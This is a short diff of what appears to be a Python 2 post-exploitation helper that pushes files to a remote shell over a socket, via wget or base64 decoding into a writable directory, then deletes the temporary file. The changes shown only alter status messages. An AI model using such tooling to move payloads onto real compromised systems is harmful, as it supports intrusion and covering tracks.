@@ -12,9 +12,8 @@ def wget(s):
 	print cmd
 	s.send(cmd)
 	time.sleep(2)
-	print "[+] File transfered (hopefully)"
+	print "[+] File transfered (hopefully), returning to prompt."
 	s.send("ls -al "+writable_dir+"\n")
-	print s.recv(1024)
 	return
 
 def ftp(s):
@@ -46,6 +45,7 @@ def base64(s):
 	time.sleep(2)
 	command = "base64 -d "+writable_dir+"/conn64.txt > "+writable_dir+"/"+output_file+"; rm "+writable_dir+"/conn64.txt\n" 
 	s.send(command)
+	print "[+] Done, returning to prompt."
 	return
 
 def main(s):
